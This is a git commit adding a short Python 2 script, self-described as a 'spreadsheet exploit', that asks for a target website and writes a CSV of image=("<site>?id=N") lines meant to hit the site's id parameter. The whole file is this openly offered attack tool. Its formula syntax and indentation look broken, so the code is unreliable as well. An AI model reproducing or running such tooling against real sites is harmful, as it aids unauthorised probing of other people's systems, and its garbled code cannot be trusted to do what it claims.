657028557d20b009cb620009c85c0a4268067fdf
incognito04 <mangowalk04@gmail.com>
2017-01-12 16:30:00 +0000

    Add files via upload

---
+++ spreadsheet_creator.py
@@ -0,0 +1,56 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+# spreadsheet exploit by Hazy
+
+import time as t
+import os 
+
+
+logo = '''
+                              _     _               _                     _       _ _   
+                             | |   | |             | |                   | |     (_) |
+ ___ _ __  _ __ ___  __ _  __| |___| |__   ___  ___| |_    _____  ___ __ | | ___  _| |_ 
+/ __| '_ \| '__/ _ \/ _` |/ _` / __| '_ \ / _ \/ _ \ __|  / _ \ \/ / '_ \| |/ _ \| | __|
+\__ \ |_) | | |  __/ (_| | (_| \__ \ | | |  __/  __/ |_  |  __/>  <| |_) | | (_) | | |_ 
+|___/ .__/|_|  \___|\__,_|\__,_|___/_| |_|\___|\___|\__|  \___/_/\_\ .__/|_|\___/|_|\__|
+    | |                                                            | |                  
+    |_|                                                            |_|                  
+
+'''
+
+def main():
+    print logo
+    try:
+    	site = raw_input('website to test > ')
+    	try:
+    	        lines = int(raw_input("Amount of ID parameters > "))
+    	except ValueError:
+		print("\nmake sure you type a number for the amount of tags")
+    		t.sleep(3)
+		main()
+        name = ("image=(\"{}?id=".format(site))
+	
+	file = open('spreadsheet.csv', 'w')
+	test = 0
+	while test < lines:
+		test = test + 1
+		creator = ("{}{}\")\n".format(name, test))
+		print creator
+		file.writelines(creator)
+        answer1 = raw_input('\nFile saved as spreadsheet.csv Do you want to exit? [Y/n]')
+    	if answer1.lower() == 'n':
+	        main()
+        else:
+                print('Closing') 
+    	        file.close()
+    	        exit() 
+    except KeyboardInterrupt:
+		answer = raw_input('\n\nDo you want to exit? [Y/n]')
+    		if answer.lower() == 'n':
+			main()
+    		else:
+			print('Closing')    
+    			exit()
+
+main()
+
